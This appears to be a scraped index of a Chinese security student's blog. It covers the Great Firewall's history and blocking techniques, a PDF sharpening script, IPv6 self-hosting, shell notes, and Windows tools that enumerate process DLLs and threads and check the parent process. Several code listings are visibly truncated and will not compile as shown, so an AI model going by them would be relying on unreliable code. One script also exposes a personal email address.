2002年3月20日，多个国家计算机网络与信息安全管理中心省级分中心同时成立。 2002年9月3日，Google.com被封锁，主要手段为DNS劫持。 2002年9月12日，Google.com封锁解除，之后网页快照等功能被封锁，手段为TCP会话阻断。 2002年11月，经费6600万的国家信息安全重大项目”大范围宽带网络动态阻断系统”（大范围宽带网络动态处置系统）项目获国防科学技术二等奖。云晓春排名第一，方滨兴排名第二。哈尔滨工业大学计算机网络与信息内容安全重点实验室李斌、清华大学计算机系网络技术研究所、清华大学网格计算研究部杨广文有参与。 2003-2007年，方滨兴任信息产业部互联网应急处理协调办公室主任。 2003年1月31日，经费4.9亿的国家信息安全重大项目”国家信息安全管理系统”（005工程）获2002年度国家科技进步一等奖，方滨兴排名第一，胡铭曾排名第二，清华大学排名第三，哈尔滨工业大学排名第四，云晓春排名第四，北京大学排名第五，郑纬民排名第七，中国科学院计算技术研究所有参与。 2003年2月，在北京的国家计算机网络与信息安全管理中心综合楼工程竣工。 2003年7月，国家计算机网络应急处理协调中心更名为国家计算机网络应急技术处理协调中心。 2003年9月2日，全国”金盾工程”会议在北京召开，”金盾工程”全面启动。 2004年，国家信息安全重大项目”大规模网络特定信息获取系统”，经费7000万，获国家科技进步二等奖。 2005年，方滨兴任国防科学技术大学兼职教授、特聘教授、博士生导师。 2005年，方滨兴被遴选为中国工程院院士。 2005年，”该系统”已经在北京、上海、广州、长沙建立了互相镜像的4套主系统，之间用万兆网互联。每套系统由8CPU的多节点集群构成，操作系统是红旗Linux，数据库用的是OracleRAC。2005年国家计算机网络与信息安全管理中心（北京）就已经建立了一套384*16节点的集群用于网络内容过滤（005工程）和短信过滤（016工程）。该系统在广州、上海都有镜像，互相以十万兆网链接，可以协同工作，也可以独立接管工作。 2006年11月16日，”金盾工程”一期在北京正式通过国家验收，其为”为中华人民共和国公安部设计，处理中国公安管理的业务，涉外饭店管理，出入境管理，治安管理等的工程”。 2007年4月6日，国家计算机网络与信息安全管理中心上海分中心机房楼奠基，位于康桥镇杨高南路5788号，投资9047万元，”……是国家发改委批准实施的国家级重大项目，目前全国只有北京和上海建立了分中心，它是全国互联网信息海关，对保障国家信息安全担负着重要作用。” 2007年7月17日，大量使用中国国内邮件服务商的用户与国外通信出现了退信、丢信等普遍现象。 和GFW相关历史进程基本到这里就结束了，剩下的就是锦上添花的一些行为了。上面提到了一个“金盾系统”，GFW主要是舆情情报系统的工具，而金盾主要是公安系统的工具。 G F W的性质 任何系统都是由软件+硬件的方式组成的，根据不可靠来源，参与GFW组成的有IDS、Cisco还有方院士团队（这绝非是一群酒囊饭袋，而是一群有真才实学的网络精英组成）。但是另一种说法（可信度较高）阐明了设备来源主要是曙光和华为，没有思科、Juniper，软件大部为自主开发。 GFW对网络内容的过滤和分析是双向的，GFW不仅针对国内读者访问中国境外的网站进行干扰，也干扰国外读者访问主机在中国大陆的网站。 GFW性质上是纯粹的科研技术部门，是政治势力的一个工具（即没有主观能动性和自主性）。GFW内部有很严格权限管理，技术与政治封装隔离非常彻底。封什么还是解封什么，完全由上峰决定，上级授权专门人员操作关键词列表，互相都不知道在做什么。所以很多时候一些莫名其妙的封禁比如 封freebsd.org封freepascal.org（可能都联想到freetibet.org），或者把一些只是字符相似的网址封掉，都是那些摆弄着IE6的官僚们的颐指气使，技术人员要是知道了都得气死。 常见技术实现 主要技术是域名劫持、IP封锁、关键字过滤阻断、HTTPS证书过滤。还有下面三种传闻中的方式 0、域名劫持 dns污染 GFW最常用的手段。全球只有13个顶级域名服务器，为了分流减压，ISP（网络服务提供商）通常都会缓存一些域名信息，而DNS劫持的一个手段就是污染这些缓存信息，也就是修改想要屏蔽的站点的域名信息。让你域名解析直接解析到错误的ip上，自然就无法访问。 或者GFW在DNS查询使用的UDP的53端口上根据黑名单进行过滤，遇到通往国外的使用UDP53端口进行查询的DNS请求，就返回一个虚假的IP地址。 1、IP封锁 比较底层，接近于切光缆拔网线，没有什么技术可言，这种封锁实施以后除了绕道而过也没有更好的解决办法。就直接不允许这个ip通信，常用于封一些VPN的服务器上。在通往国外的最后一个网关上加上一条伪造的路由规则，导致通往某些被屏蔽的网站的所有IP数据包无 法到达。 2、关键字过滤阻断 主要是针对的HTTP协议的默认端口进行监听，因为http传输的是明文内容，所以可以很方便的进行检查并且进行关键词敏感词匹配。 比如侦测到host是YouTube，GFW（扮演IDS的作用）就会向两头的计算机发送reset包，干扰正常的TCP连接，导致无法上网。 另一种情况就是检查内容的时候发现内容里有不合法的内容，就会打断连接，导致网页无法加载完全。 发生阻断之后， 会在一段时间内无法浏览对应ip地址相同端口上的内容。 3、端口封锁 GFW直接给你把特定ip地址的特定端口的所有数据包直接丢弃。导致某个ip的特定端口（比如：22，23，443，80）在国内都无法访问。 GFW通过间接性的丢包和偶尔恢复功能，使得国内可以使用某些服务，但是无法很舒服的使用。 4、SSL连接隔断 GFW通过伪装成客户端向服务端发送reset包；再伪装成服务端向客户端发送rst包，影响TCP的建立，打断SSL握手，导致ssl连接失败。但是这种方式他并不会破译出网站的内容，只是暴力的阻断操作。 发展趋势 GFW在数据挖掘和协议分析上做的还比较成功多媒体数据如音频、视频、图形图像的智能识别分析、自然语言语义判断、识别模式匹配 、p2p、 VoIP、 IM、 流媒体、 加密内容识别过滤、串接式封堵等是将来的重点。 利用机器学习和人工智能好像可以极大的增强GFW的封锁能力和限制能力，但是不过GFW也没有像机器学习之类的自组织反馈机制来自动生成关键词，因为它本身没有修改关键词的权限。 参考 本文直接抄袭了很多文章，感觉解释的很好没必要再重说一遍。 网络上的一些文章总是被不同的同志进行转存或者是以txt等形式存活下来，通过大量的文章总结，发现GFW的原理的研究基本无出其右 Thomas Ptacek等在98年发表的Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection https://groups.google.com/g/gfw-blog/c/BHAest561kc?pli=1《阅后即焚·GFW》 https://paper.bobylive.com/Network/GFW%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90.pdf《纯属胡扯八蛋、浪费时间、狗屁不通、纯纯狗屁文章》 https://www.svlik.com/1804.html http://docs.jonsam.site/project-9/doc-58/ https://blog.csdn.net/qq_50216270/article/details/121211597 https://blog.gd1214b.icu/post/r3oKMxMPu/ https://code.google.com/archive/p/ab-mfc/wikis/GFW.wiki https://github.com/hoochanlon/fq-book/blob/master/docs/abc/gfw.md https://blog.csdn.net/qq_50216270/article/details/121211597 https://superxlcr.github.io/2018/07/01/%E4%B8%8A%E7%BD%91%E9%99%90%E5%88%B6%E5%92%8C%E7%BF%BB%E5%A2%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/ https://gfwrev.blogspot.com/2009/10/gfw.html 源码阅读 https://www.codedump.info/post/20190324-how-to-read-code/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-28 10:40:40 "},"MyArticles/Dailynotes/pdf解析重组.html":{"url":"MyArticles/Dailynotes/pdf解析重组.html","title":"电子书清晰化的尝试 利用python","keywords":"","body":"在网上下载了一个扫描版的pdf电子书，但是书籍看起来不清楚，很模糊。于是想到通过将pdf里的每一页的图片提取出来然后经过锐化，最后再组成pdf的一个形式来使图片里的文字变的清晰。通过python来实现。 因为这是一本绝版书，淘宝上买的高于原价不少，所以决定直接操作pdf。网上找了很多pdf，大小都是一样的（60多MB），所以判定为这是唯一pdf版本，其他版本很难找了。 原画质 文字模糊，给人一种神秘感，通过一定手段来进行锐化处理。 import fitz import glob import os import cv2 import numpy as np def pdf2img(): doc = fitz.open(\"test.pdf\") pages = 20 for i in range(0, pages): page=doc.load_page(i) pix = page.get_pixmap() pix.save(\"img\\\\pdf\"+str(i)+\".png\") # 将图片进行锐化 def changes(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 print(img) image = cv2.imread(img) kernel = np.array([[0, -1, 0], [-1, 5, -1], [0, -1, 0]], np.float32) dst = cv2.filter2D(image, -1, kernel=kernel) cv2.imshow(\"custom_blur_demo\", dst) path = img+\"_c.png\" print(path) cv2.imwrite(path, dst) # print(\"success\") # 将锐化之后的图片重新组合成为pdf def img2pdf(): img_dir = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\pyclean\\\\img\" doc = fitz.open() for img in sorted(glob.glob(\"{}/*\".format(img_dir))): # 读取图片，确保按文件名排序 if \"_c\" in img: print(img) imgdoc = fitz.open(img) # 打开图片 pdfbytes = imgdoc.convertToPDF() # 使用图片创建单页的 PDF imgpdf = fitz.open(\"pdf\", pdfbytes) doc.insertPDF(imgpdf) # 将当前页插入文档 if os.path.exists(\"allimages.pdf\"): os.remove(\"allimages.pdf\") doc.save(\"allimages.pdf\") # 保存pdf文件 doc.close() print(\"######################\") # 先把pdf转图片，并存储在指定的目录中 pdf2img() # 对图片进行锐化处理 changes() # 图片转pdf img2pdf() 新画质 经过锐化之后，看到图片的效果得到明显改进，黑白对照更加明显了 看上去好像是更像是扫描的了，实际上如下 😅更不清楚了，真他奶奶滴服气啦。 解决方案 去孔夫子旧书网淘本二手书，麻了还有10块的运费，操。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-21 20:01:48 "},"MyArticles/Dailynotes/ipv6_base_vps.html":{"url":"MyArticles/Dailynotes/ipv6_base_vps.html","title":"搭建ipv6自有服务器","keywords":"","body":"因为之前的vps到期的原因，续费太贵，于是利用ipv6将本机的一个虚拟机作为vps来使用，实测可以通过ssh正常连接访问和scp服务 ssh usrname@###:###:####:####:#### scp local/file usrname@[###:###:####:####:####] 获得ipv6 在学校，没有猫，路由器直接连网线，ipv4的公网ip枯竭，ipv6的多如牛毛。直接打开路由器的ipv6功能，tplink可以，sb水星路由器不行，营业厅送的电子垃圾。 打开路由器的ipv6功能之后，现代电脑默认开启ipv6服务了，使用ipv6测试网站试一下,然后直接ipconfig看一下就可以了。公网ipv6一般是2开头的 一般这个暂时ipv6是公网ip，这个就允许外网访问了。 配置虚拟机 用的vmware，安装一个ubuntu serve，desktop太占资源了，安装好之后改成桥接模式 然后ifconfig看一下ipv6，还有一个问题就是ipv6是会变的，所以需要在变化的时候通知你 ipv6会变 动态分配：网络服务提供商（ISP）通常会采用动态IPv6地址分配，因此您的IPv6地址可能会随着时间的推移而更改。这是为了确保网络资源的有效使用和管理。 重启路由器或重新连接：如果您的路由器或网络设备重新启动或重新连接到网络，它可能会被重新分配一个新的IPv6地址。 网络安全：某些ISP会定期更改其客户的IPv6地址以增强网络安全性。这是为了防止攻击者使用旧的地址来攻击网络。 通知方式 要不就ddns绑定域名，有成本，放弃。 通过邮件通知 check_ip.sh内容如下 ifconfig > ip.txt 就直接运行下面这个脚本就可以 import os import time import smtplib from email.header import Header from email.mime.text import MIMEText def sendEmail(new_addr): message = MIMEText(\"new ipv6 addr --> \"+new_addr) # 邮件内容 message['From'] = Header('Ubuntu-VPS') # 邮件发送者名字 message['To'] = Header('rootkit') # 邮件接收者名字 message['Subject'] = Header('ipv6 has changed!') # 邮件主题 mail = smtplib.SMTP() mail.connect(\"smtp.qq.com\") # 连接 qq 邮箱 mail.login(\"1621043986@qq.com\", \"$$$$$$$$$$$$$$$$$$$\") # 账号和授权码 mail.sendmail(\"1621043986@qq.com\", [\"1621043986@qq.com\"], message.as_string()) # 发送账号、接收账号和邮件信息 addr = '240e:3a1:2095:7100:20c:29ff:fe9b:64f' ipv6 = '' while 1: os.system(\"./check_ip.sh\") with open(\"ip.txt\", 'r')as file: content = file.readlines() ip6 = [] for c in content: if \"inet6\" in c: ip6.append(c) # print(' sss '+c) tmp = ip6[-3].split(' ') # print(tmp) for i in tmp: if len(i) > 24: ipv6 = i # ip 已经更新 # print(ipv6) if \":\" not in ipv6 and len(ipv6) \" + time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"already send updata information\") print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) + \"no updata\") time.sleep(60 * 5) 腾讯邮箱的登录密钥直接去网页，设置，账户，下面就能找到 主机配置 CPU：5600g 主板：TUF B550m-e memory : 3200 ddr4 英睿达 8*2 电源：长城铜牌500W 1T的希捷酷鱼机械硬盘，装esxi系统； 1T的SN570装win10系统 机箱：嘉航 暗影猎手5 + 仨风扇 散热：AMD原装 / 雅俊 b3-pro 除了电源，都来自pdd。总共2049￥ 系统 win10 用来正常使用，为以后正常使用做准备 esxi6.7 用来当服务器的系统，需要提前打包好网卡驱动，不然只能往服务器上装 使用 直通 AMD的核显直通不太理想，会失败 N卡GPU尚未购买 网络 没有多余配置，开启了路由器的ipv6功能，实现公网访问。 条件有限，没法配置多网卡，比较遗憾。 起虚拟机 直接启 上传iso文件，然后直接在虚拟机界面创建就行 上传 利用本地的VMware先修改虚拟机兼容性 然后导出之后把磁盘合并一下（vmware自带的磁盘合并工具，注意参数就行）。把一些不需要的硬件支持删除掉，不然上传esxi会报错 留下这些就可以了。 通过esxi的界面上传到磁盘，然后ssh连接到esxi，找到磁盘的路径，需要使用自带的工具去修改vmdk的格式去适合esxi，注意thin参数， vmkfstools -i 原始vmdk文件名 新vmdk文件名 -d thin 然后在虚拟机界面进行注册，不要在磁盘界面注册虚拟机，会导致虚拟机无效。 效果 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 16:34:16 "},"MyArticles/Dailynotes/learn_shell.html":{"url":"MyArticles/Dailynotes/learn_shell.html","title":"Shell 学习","keywords":"","body":"记录一下学习shell编程中的一些代码 变量 #!/bin/bash you_name=\"Test Me\" # 这里针对variable的赋值不能有空格，变量名称不能有空格，等号左右不能有空格 echo ${you_name} # 利用语句命令对变量赋值 # 循环用do-done结构，for结尾用分号表示判断语句结束，同时用``来表示命令行或者是指令 for file_name in `ls`; do echo $file_name done # 针对变量的操作 test_variable=\"crootkit\" readonly test_variable # 使变量只读 echo $test_variable # 删除变量(只读变量是不能被删除的,而且设置只读之后不能被恢复) # unset test_variable echo $test_variable 字符串 #!/bin/bash # 根据shell的aaa对单引号和双引号的规则，我决定shell中一律使用双引号 name=\"this is a string\" echo $name test_str=\"look at this \\\"$name\\\" \" echo \"-e\" $test_str echo $test_str 切片 #!/bin/bash # using ${#string} to get the length of string str=\"this is a string\" echo \"len of str is \" ${#str} # using ${string:i:j} to get the sub string in string str=\"acdefghijklmn\" echo ${str:1:5} # find specific string using `` & expr index $string sub_str echo `expr index $str c` 数组 #!/bin/bash arry=(1 2 3 4 5 6 7 8 9 10) # using ${array[@]} to print all array elements echo ${arry[@]} # for array, you must use full ${} to print it arry[0]=\"123\" arry[1]=999999999999 echo ${arry[@]} # get elements nunmber [*] or [@] echo ${#arry[@]} echo ${#arry[*]} # delet specific left str by # # delet specific right str by % str=\"http://aabbccddeeffjjhhiiggkk1122334455\" # delet // left str echo ${str#*//} # delet // right str echo ${str%//*} # if you want delet to point char ,you can use double # or % echo ${str%%a*} # using declare arry just like the dictionary declare -A dict_arry=([\"one\"]=1 [\"two\"]=2 [\"three\"]=3 [\"fore\"]=4) echo ${dict_arry['one']} echo ${dict_arry[@]} echo ${#dict_arry[*]} 计算 #!/bin/bash # full expressoins should be include by `` # using 'expr' to add support to shell, because native shell not support normal calculate # space is required between expreesions and operations var=`expr $1 + $2` echo $1 \"add\" $2 \"equal\" $var # conditional expressions must be included by [], and space between expressions and operations echo $[ $1 == $2 ] # return 0 or 1 if [ $var == 24 ] then echo \"$1 * $2 == 144\" fi # -eq -ne…… 这些关系运算符只支持数字，不支持字符串 n1=\"abcdef\" n2=\"abcdef\" if [ $n1 == $n2 ] then echo \"equal\" else echo \"not equal\" fi # bool operations # -a = and # -o = or # ! = not # 逻辑运算符 # && || # string opre: # -n -z check if the strlen = 0 str=\"abcd\" if [ -z str ] then echo \"zero\" else echo \"no 0\" fi 控制流 判断 if-else #!/bin/bash # 利用if判断有多少参数，程序本身自己的启动命令算¥0，但是程序不会将其计算在参数列表内 if [ $# == 1 ] then echo you have one para $* elif [ $# == 2 ] then echo you have two para $@ else echo you have many para $* fi #(())test if (( $# > 3 )); then echo dayu 3 ge para fi if [ $# > 3 ] then echo above 3 para fi 利用test #!/bin/bash # test 用来判断条件是否成立 n1=$1 n2=$2 if test $n1 -eq $n2 then echo 两个参数相同 else echo 两个参数不同 fi if [ $n1 -eq $n2 ] then echo == else echo != fi s1=\"abcdefg\" s2=\"1234567\" readonly $s1 if test $s1 = $s2 then echo equal else echo no equal fi # 和上面的方法一样，同样可以用来检查文件的一些问题 case-esac #!/bin/bash # 类似于C的switch-case结构，除了语法基本上一样 echo -n input a number: read input_num case $input_num in 1) echo you 1 ;; 2) echo you 2 let input_num++ ;; 3) echo you 3 ;; 4|5|6|7|8|9|10) echo you many ;; *) echo you miss ;; esac # 执行完匹配就结束了，并不会一直执行下去 循环 #!/bin/bash # 循环的间隔默认是通过 \"空格\" for i in 1 2 3 4 5 6 7 do echo -e $i \"\\n\" done str=\"ab cd ef gh ij kl mn\" for c in $str do echo $c ', ' done # 使用let来执行表达式，比如let b=9+1之类的东西，不用带¥标记变量 sum=10 while (( $sum 函数 #!/bin/bash # 函数返回值只能是一个整数 0-255，默认最后一句的结果是返回值，或者用return，主函数用$?来表示返回值 first_func() { printf \"%s\" \"this is my first func in shell\" } first_func echo the retuen is $? add_func() { echo the ten para is ${10} echo the ten para is $10 #这两种计算都是可以的 # return $(( $1 + $2 )) return `expr $1 + $2` } # 函数的参数其实和程序的参数是一样的 add_func 12 12 1 1 1 2 2 2 2 2 3 3 3 echo the res is $? 参数 #!/bin/bash # using $n to use para # first para is this shell # usr para begin from second echo \"测试shell添加启动参数\" echo \"first : $0\" echo \"second : $1\" echo \"third : $2\" # using $# to get num of para echo \"total\" $# #using $* to print all para echo \"all para\" $* # using $$ to get current PID echo $$ # using $* the all argu will be analyse to a string for argumet in \"$*\"; do echo $argumet done # using $@, the argu will be analyse one by one for argu in \"$@\"; do echo $argu done print #!/bin/bash # 在shell里，echo和printf的功能基本类似，但是根据教程说，printf的可移植性更高 # printf format_string [arguments] # %作为格式替换符，类似于c语言；-代表左对齐；数字代表宽度 printf \"%-10s %-12s %-12s\\n\" 我是大傻逼 我在轻化2001 我78kg重 printf \"%-10s %-12s %-12s\\n\" abc def 123aaaaaaa printf \"%-10s %-12s %-12s\\n\" 1 2 3 # 当参数多余格式字符串,会重用最后一个格式化字符输出 printf \"%s %d %f\\n\" abc 123 4.1234 abcdefh # using %b to use \\ # 如果这里用\\s那么就会将n直接输出，但是%B可以解决这个问题 printf \"test \" \"A\\nb\" 文件 读文件直接用cat命令；写文件直接用重定位 >> #!/bin/bash # check the unix attributes file_name=\"testfile\" if [ -e file_name ] then if [ -x file_name ] then echo $file_name is excutable fi else echo \"no such a file\" fi # 类似这种格式，判断符号太多了，先用先查 重定位 #!/bin/bash # 正常的重定位 echo this is a string > redirct_file # 追加 echo add the new string >> redirct_file # 如果你不想让命令输出到屏幕上，可以用/dev/null文件，输入到这个文件的内容都会被抛弃 echo aaaaaaaaaaaaaaaaaaaaaaaaaa > /dev/null # stdin 0 ; stdout 1 # 将报错信息也就是stderr（2）重定向到testfile a=10 let b=a/0 2>>testfile 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-19 14:47:18 "},"MyArticles/Dailynotes/就业意向.html":{"url":"MyArticles/Dailynotes/就业意向.html","title":"就业意向","keywords":"","body":"意向 经过几轮24界暑假实习的面试，基本也在和面试官的一次次交流和学长学姐的一次次沟通下基本确定了方向。 大方向 希望能站在网络攻防，网络安全的一线上，时刻面对新的攻击和挑战。还是偏向实战的方向。但是面向实战的安全研究也是一个预期的方向。 目前技能 技能分布在二进制安全方向。 原因：CTF出身，学的就是二进制方向，针对web方向的攻防是一个漏洞。 二进制细分的话，分为几个方面： 在逆向分析方向强于漏洞挖掘，因为一直是以逆向分析作为一个发展目标，近期通过分析市场需求发现，逆向发展的一个方向主要有威胁狩猎、安全攻防；漏洞挖掘方面的话，对二进制漏洞挖掘意向不大。 在逆向分析领域，针对android平台的分析弱于Windows和linux平台，因为遇到的少。但是通过需求分析，发现移动安全的需求高于传统安全。 职业意向 想去安全蓝军，想去红队，但是技术上目前还有所欠缺。但是会一直努力的。这学期（23年初）分析完手头的几个样本之后，开始深入学习一下Windows的内核知识，同时关注了解一下云原生的相关安全知识。 如果要从事安全研究的话，仅有二进制方向知识是远远不够的，所以web攻防方面的知识也是需要补充的，准备暑假去补充一下这个技术。就学一些基础的知识就好，重心还是在二进制方向上。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 11:45:05 "},"MyArticles/Development.html":{"url":"MyArticles/Development.html","title":"Development","keywords":"","body":"大丈夫生居天地间，岂能郁郁久居人下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:24 "},"MyArticles/Development/find_dll_in_proc.html":{"url":"MyArticles/Development/find_dll_in_proc.html","title":"Find DLL in Process","keywords":"","body":"通过LDR结构体去观察已经载入的dll。如果想直到所有的用到的dll可以通过访问程序的导出表，这里的工具是利用LDR观察正在使用的dll。DLL 是在需要时动态加载的，因此有可能某些 DLL 尚未加载。 缺点：无法观察到通过loadlibrary载入的dll文件。 使用方式： fdip [pid] #include #include #include #include #include \"struct.h\" typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main(int argc, char* argv[]) { // 没有获取到参数的情况 if (argc \\n\", argv[0]); printf(\"Example: fdip32 [proc Id]\\n\"); return 1; } DWORD ProcID = atoi(argv[1]); //DWORD ProcID = 32956; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcID); HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); PPEB_LDR_DATA ldrr = peb.Ldr; PLIST_ENTRY pListEntry = ldrr->InMemoryOrderModuleList.Flink; if (!strcmp(argv[1], \"-a\") || !strcmp(argv[1], \"--a\")) { while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); printf(\"[+^+] Loaded DLL: LLLLL\\tbase address: \\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); pListEntry = pListEntry->Flink; } } else { while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); printf(\"[++] Loaded DLL: LLLLL\\nbase address: \\n\\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); pListEntry = pListEntry->Flink; } } printf(\"have a nice day :-)\\n\"); CloseHandle(hProcess); return 0; } 上述代码的 printf(\"[++] Loaded DLL: LLLLL\\nbase address: \\n\\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); 里面的LLLLL应该是{%ws}，但是md识别有问题。 思路：通过PEB定位到LDR，然后通过利用InMemoryOrderModuleList访问到LDR_DATA_TABLE_ENTRY结构体，然后通过里面的DllBase FullDllName来访问基址和模块名称。 typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID Reserved3[2]; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; #pragma warning(push) #pragma warning(disable: 4201) // we'll always use the Microsoft compiler union { ULONG CheckSum; PVOID Reserved6; } DUMMYUNIONNAME; #pragma warning(pop) ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 使用效果 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 22:10:41 "},"MyArticles/Development/find_thread_in_process.html":{"url":"MyArticles/Development/find_thread_in_process.html","title":"Find Thread in Process","keywords":"","body":"查找进程中的线程 本程序实现了针对输入的proc id，查看该进程中的所有的线程，并且获取线程id的功能。 #include #include #include #include #include int main(int argc , char* argv[]) { // 没有获取到参数的情况 if (argc \\n\", argv[0]); printf(\"Example: ftip [proc Id]\\n\", argv[0]); return 1; } int notePID = atoi(argv[1]); // 申请空间 LPDWORD pThreadIdList = NULL; DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { printf(\"VirtualAlloc Failed\\n我也没辙 :-)\\n\"); return 1; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照, 通过第一个参数快照系统中的所有线程，指定进程的快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, notePID); if (hThreadSnap == INVALID_HANDLE_VALUE) { printf(\"Get all threads in system Failed\\n我也没辙 :-)\\n\"); return 1; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组【有关系统快照中遇到的任何进程的第一个线程的信息。】 //函数返回的快照的句柄 , 指向 THREADENTRY32 结构的指针 BOOL bRet = Thread32First(hThreadSnap, &th32); int i = 0; while (bRet) { printf(\"[=> %d ] the thread id is \\t\\t\", ++i, th32.th32ThreadID); if(i%2==0 && i!=0) { printf(\"\\n\"); } // 先检查当前线程是不是指定进程下的线程 if (th32.th32OwnerProcessID == notePID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } // 遇到的任何进程的下一个线程的信息 bRet = Thread32Next(hThreadSnap, &th32); } printf(TEXT(\"\\nThere are %d threads in process %d.\\n\"), dwThreadIdListLength, notePID); return 0; } 实现了查找目标进程中所有的线程号和线程数量。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-05 23:01:45 "},"MyArticles/Development/Build-Arm.html":{"url":"MyArticles/Development/Build-Arm.html","title":"构建qemu的持续学习","keywords":"","body":"买不起ARM设备，直接在ubuntu上起一个qemu进行模拟arm开发环境 配置环境 sudo apt-get install gcc gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi qemu-user gdb-multiarch 然后再继续安装qemu的依赖项 sudo apt-get install build-essential gcc pkg-config glib-2.0 libglib2.0-dev libsdl1.2-dev libaio-dev libcap-dev libattr1-dev libpixman-1-dev 下载qemu wget https://download.qemu.org/qemu-3.0.0.tar.xz 最简单的就是下载qemu的源码本地编译 建议提前建一个文件夹，然后解压这个文件 tar xvJf qemu-3.0.0.tar.xz 先编译，cd qemu-3.0.0 ./configure 可能的报错： make的时候总是报错，就找到那个报错的文件，把报错的那一行的static关键字删除 关于python的报错：ERROR: Python not found. Use --python=/path/to/python： 直接apt install python, 就行 然后最后一步，可能需要一点时间 make&&make install 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-20 19:32:17 "},"MyArticles/Development/查看父进程.html":{"url":"MyArticles/Development/查看父进程.html","title":"查看父进程","keywords":"","body":"原理 Windows下运行一个程序他的父进程一般都是explore，linux下一般是bash，因为是从shell界面直接起的。 实现方式很多，基本思路就是： 获得父进程的pid 利用pid查找proc name windows C using System; using System.Diagnostics; using System.Management; using System.Windows.Forms; namespace Check_Father { class check_father_proc { static bool if_proc = true; static void Main(string[] args) { // 获取当前进程对象 try { Process currentProcess = Process.GetCurrentProcess(); if (GetParentProcess(currentProcess).ProcessName.Equals(\"explore\")) { if_proc = true; } else { Console.WriteLine($\"{GetParentProcess(currentProcess).ProcessName}\"); } } catch { Environment.Exit(0); } } private static Process GetParentProcess(Process process) { // 获取指定进程的父进程 ID int parentProcessId = 0; ManagementObjectSearcher searcher = new ManagementObjectSearcher($\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"); ManagementObjectCollection collection = searcher.Get(); foreach (ManagementObject obj in collection) { parentProcessId = Convert.ToInt32(obj[\"ParentProcessId\"]); break; } // 获取父进程对象 Process parentProcess = null; if (parentProcessId > 0) { try { parentProcess = Process.GetProcessById(parentProcessId); } catch (Exception) { parentProcess = null; } } return parentProcess; } } } 调用 GetCurrentProcess() 方法获取当前进程对象。 调用 GetParentProcess() 方法获取当前进程的父进程对象。 判断父进程对象的 ProcessName 属性是否为 \"explorer\"，以确定父进程是否为 Windows Explorer。 其中，步骤 2 主要是通过 WMI (Windows Management Instrumentation) 查询获取当前进程的父进程 ID，然后通过调用 Process.GetProcessById() 方法来获取父进程对象。具体实现是： 调用 ManagementObjectSearcher 对象的 Get() 方法来执行 WMI 查询，查询条件为获取父进程 ID，查询语句为 $\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"。 遍历查询结果，获取父进程 ID。 调用 